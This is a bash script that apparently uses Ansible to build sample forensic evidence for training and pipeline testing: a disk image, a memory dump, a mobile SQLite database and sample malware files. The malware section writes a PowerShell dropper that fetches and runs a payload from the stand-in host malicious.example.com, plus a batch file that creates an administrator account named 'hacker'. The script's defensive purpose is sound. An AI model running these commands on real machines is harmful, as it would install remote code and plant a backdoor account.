#!/bin/bash
# Create realistic sample evidence for testing

SAMPLE_CASE_ID="SAMPLE-TRAINING-$(date +%Y%m%d)"

echo "Creating sample evidence for training case: $SAMPLE_CASE_ID"

# Create sample disk image with filesystem
ansible forensics -i ../inventory.yml -m shell -a "
    # Create sample evidence directory
    mkdir -p /data/evidence/samples
    cd /data/evidence/samples
    
    # Create a small disk image
    dd if=/dev/zero of=${SAMPLE_CASE_ID}-disk.img bs=1M count=50
    
    # Create loop device and format
    sudo losetup /dev/loop0 ${SAMPLE_CASE_ID}-disk.img || echo 'Loop device busy, continuing...'
    sudo mkfs.ext4 /dev/loop0 -F || echo 'Filesystem exists, continuing...'
    
    # Mount and add sample files
    mkdir -p mount_point
    sudo mount /dev/loop0 mount_point || echo 'Already mounted'
    
    # Add sample files
    sudo bash -c 'echo \"This is a sample document from the investigation\" > mount_point/document.txt'
    sudo bash -c 'echo \"2024-01-01 10:00:00 - User login event\" > mount_point/system.log'
    sudo bash -c 'echo \"Suspicious network connection to 192.168.1.100\" >> mount_point/system.log'
    sudo bash -c 'echo \"malware.exe executed\" >> mount_point/system.log'
    
    # Create sample directories
    sudo mkdir -p mount_point/{Users,Windows,Program Files}
    sudo bash -c 'echo \"Windows Registry Entry\" > mount_point/Windows/system.dat'
    sudo bash -c 'echo \"User profile data\" > mount_point/Users/profile.dat'
    
    # Unmount and cleanup
    sudo umount mount_point || echo 'Unmount failed'
    sudo losetup -d /dev/loop0 || echo 'Loop device cleanup failed'
    
    echo 'Sample disk image created: ${SAMPLE_CASE_ID}-disk.img'
"

# Create sample memory dump
ansible forensics -i ../inventory.yml -m shell -a "
    cd /data/evidence/samples
    
    # Create sample memory dump with some patterns
    dd if=/dev/urandom of=${SAMPLE_CASE_ID}-memory.dmp bs=1M count=20
    
    # Add some recognizable strings
    echo -n 'notepad.exe' | dd of=${SAMPLE_CASE_ID}-memory.dmp bs=1 seek=1000 conv=notrunc
    echo -n 'cmd.exe' | dd of=${SAMPLE_CASE_ID}-memory.dmp bs=1 seek=2000 conv=notrunc
    echo -n '192.168.1.100' | dd of=${SAMPLE_CASE_ID}-memory.dmp bs=1 seek=3000 conv=notrunc
    
    echo 'Sample memory dump created: ${SAMPLE_CASE_ID}-memory.dmp'
"

# Create sample mobile data
ansible forensics -i ../inventory.yml -m shell -a "
    cd /data/evidence/samples
    
    # Create sample mobile database
    sqlite3 ${SAMPLE_CASE_ID}-mobile.db << EOF_SQL
CREATE TABLE contacts (id INTEGER PRIMARY KEY, name TEXT, phone TEXT);
INSERT INTO contacts VALUES (1, 'John Doe', '+1234567890');
INSERT INTO contacts VALUES (2, 'Jane Smith', '+0987654321');

CREATE TABLE messages (id INTEGER PRIMARY KEY, sender TEXT, message TEXT, timestamp TEXT);
INSERT INTO messages VALUES (1, '+1234567890', 'Meet me at the location', '2024-01-01 14:30:00');
INSERT INTO messages VALUES (2, '+0987654321', 'Package delivered successfully', '2024-01-01 15:45:00');

CREATE TABLE call_logs (id INTEGER PRIMARY KEY, number TEXT, duration INTEGER, timestamp TEXT);
INSERT INTO call_logs VALUES (1, '+1234567890', 120, '2024-01-01 14:00:00');
INSERT INTO call_logs VALUES (2, '+0987654321', 45, '2024-01-01 16:00:00');
EOF_SQL

    echo 'Sample mobile database created: ${SAMPLE_CASE_ID}-mobile.db'
"

# Create sample malware files
ansible forensics -i ../inventory.yml -m shell -a "
    cd /data/evidence/samples
    
    # EICAR test file (safe malware test signature)
    echo 'X5O!P%@AP[4\\\\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*' > ${SAMPLE_CASE_ID}-eicar.exe
    
    # Sample suspicious script
    cat > ${SAMPLE_CASE_ID}-suspicious.ps1 << 'EOF_PS1'
# Suspicious PowerShell script for testing
\$url = \"http://malicious.example.com/payload.exe\"
\$output = \"C:\\\\temp\\\\malware.exe\"
Invoke-WebRequest -Uri \$url -OutFile \$output
Start-Process \$output
EOF_PS1

    # Sample batch file
    cat > ${SAMPLE_CASE_ID}-batch.bat << 'EOF_BAT'
@echo off
net user hacker password123 /add
net localgroup administrators hacker /add
del %0
EOF_BAT

    echo 'Sample malware files created'
"

echo ""
echo "Sample evidence created for case: $SAMPLE_CASE_ID"
echo "Files available at: /data/evidence/samples/"
echo ""
echo "Use these files for:"
echo "- Training investigators"
echo "- Testing processing pipelines" 
echo "- Validating alert systems"
echo "- Demonstrating lab capabilities"